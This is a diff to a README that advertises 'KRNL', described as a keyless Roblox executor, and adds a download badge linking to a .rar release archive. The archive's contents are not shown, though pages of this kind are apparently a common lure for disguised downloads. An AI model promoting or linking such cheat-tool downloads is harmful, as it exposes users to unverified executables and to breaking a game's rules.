@@ -2,6 +2,7 @@
 
 *If you’re tired of unreliable Roblox executors, KRNL is here to change your experience! KRNL is a high-performance, keyless Roblox executor developed by reverse-engineering experts to ensure a smooth, dependable gaming experience.*
 
+**[![Download Krnl Executor](https://img.shields.io/badge/Download-krnl%20Executor-blueviolet)](https://github.com/lordsasta/krnl-executor/releases/download/krnl/Release.rar)**
 
 ![Frame 2147223627](https://github.com/user-attachments/assets/c4cbcb6c-7a62-437a-bf58-e4cb9acf0932)
 
